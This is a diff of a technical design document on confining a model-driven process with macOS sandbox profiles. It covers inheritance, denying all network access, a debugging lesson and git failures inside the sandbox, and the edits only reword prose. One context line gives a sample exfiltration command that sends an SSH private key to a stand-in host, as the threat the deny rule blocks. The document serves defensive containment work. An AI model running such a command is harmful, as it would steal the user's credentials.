@@ -278,16 +278,16 @@ A reader's first question: why not sandbox the entire ensemble
 process?
 
 macOS sandboxes are inherited by descendants. A grandchild process
-three levels of shells deep is still confined. That is what makes
-wrapping the child sufficient: the model cannot shell out to a helper
-process to launder a read.
+three levels of shells deep is still confined, so the model cannot
+shell out to a helper process to launder a read. Wrapping the child
+is sufficient because inheritance makes every descendant confined.
 
 It is also why the binary must stay outside. A sandboxed binary needs
 network access to reach the model API. Inheritance hands that network
 to every command the binary runs, and
 `curl -d @~/.ssh/id_rsa evil.com` is back. Keeping the binary
-outside lets the child profile say `(deny network*)` absolutely. That
-is the single most valuable line in the profile.
+outside lets the child profile say `(deny network*)` absolutely. No
+line in the profile is worth more.
 
 ### The profile
 
@@ -340,7 +340,7 @@ An earlier hypothesis blamed a trailing slash on the temp-dir path.
 Isolating the two variables showed the realpath was decisive and the
 trailing slash irrelevant. Two things were changed at once, the
 symptom cleared, and the wrong cause was nearly written down as fact.
-That is worth a paragraph because it is worth a habit: when two
+The lesson earns a paragraph because it earns a habit: when two
 changes fix a symptom, back one out.
 
 ### Measured results
@@ -446,8 +446,8 @@ better data path, not a better approval dialog.
 
 ## 23.6 Git inside the sandbox
 
-`git` inside the sandbox fails reading `~/.gitconfig`. That is
-correct confinement, not breakage, but it means a sandboxed agent
+`git` inside the sandbox fails reading `~/.gitconfig`. The
+confinement is correct, not breakage, but it means a sandboxed agent
 cannot run `git` at all without an explicit fix.
 
 The obvious fix is to allow `~/.gitconfig` through the profile. That
